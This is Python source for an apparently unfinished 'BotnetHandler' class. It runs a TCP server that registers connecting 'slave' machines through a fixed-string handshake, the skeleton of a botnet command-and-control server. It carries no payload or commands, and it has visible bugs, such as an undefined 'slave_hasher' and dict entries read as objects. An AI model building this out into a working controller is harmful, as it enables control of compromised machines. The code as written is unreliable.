import queue
import socket
import threading
import gurulhutils

class BotnetHandler( object ):

    def __init__( self, keys, parent, queries, replies, system ):
        self.name = "Botnet Handler"
        self.parent = parent
        self.queries = queries
        self.replies = replies
        self.system = system
        self.alive = False
        self.safe = False
        self.Slaves = {}
        self.slave_hasher = 0
        self.server_loop = threading.Thread( target=self.server, args=() )
        self.route_loop = threading.Thread( target=self.route, args=() )
        self.listen_loop = threading.Thread( target=self.listen, args=() )
        self.monitor_loop = threading.Thread( target=self.monitor, args=() )


    def start(self):
        print( "Starting " + self.name + ".", flush=True)
        self.alive = True
        self.server_setup()
        self.server_loop.start()
        self.route_loop.start()
        self.listen_loop.start()
        self.monitor_loop.start()
        print( self.name + " up!", flush=True)


    def server_setup(self):
        try:
            server = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
            server.bind( ( "0.0.0.0", 13031 ) )
            server.listen( 80 )
            server.setblocking( False )
            self.socket = server

        except Exception as e:
            print( "Error in " + self.name + ":", e, flush=True )

    def server(self):
        while self.alive:
            try:
                sock, addr = self.socket.accept()
                sock.setblocking( True )
                slave = { "socket" : sock, "address" : addr }
                if gurulhutils.socket_recv( sock ) == "dig":
                    gurulhutils.socket_send( sock, "dig joy" )
                if gurulhutils.socket_recv( sock ) == "dig joy popoy":
                    gurulhutils.socket_send( sock, "Vem brincar comigo")
                info = gurulhutils.socket_recv( sock )
                if info["hash"] == 0: #arrumar
                    slave["socket"].setblocking( False )
                    self.Slaves.update( { slave_hasher : slave } )

            except BlockingIOError:
                pass
            except Exception as e:
                print( "Error in " + self.name + ":", e, flush=True )

    def route(self):
        while self.alive:
            try:
                query = self.queries.get(True, 1)
                print( query )
                if type( query["qcontent"] ) == str:
                    token = query["qcontent"].split(" ")
                    print( token[0] )
            except queue.Empty:
                pass


    def listen(self):
        while self.alive:
            gurulhutils.sleep(100)

    def monitor(self):
        while self.alive:
            try:
                sysmsg = self.system.get(True, 1)
                if self.name in sysmsg["topic"]:
                    print( self.name, sysmsg["content"] )
                    if sysmsg["code"] == -1:
                        self.alive = False
                else:
                    self.system.put( sysmsg )

            except queue.Empty:
                pass
            except Exception as e:
                print( "Error in " + self.name + ":", e, flush=True )

        self.cleanup()

    def cleanup(self):
        for slave in self.Slaves.keys():
            self.Slaves[slave].socket.close()

        self.socket.close()

        self.server_loop.join()
        self.route_loop.join()
        self.listen_loop.join()

        self.safe = True
        self.system.put( {"topic":[self.parent, self.name],
                        "code":-1,
                        "ttl": 10,
                        "content": self.name + " has shut down."})
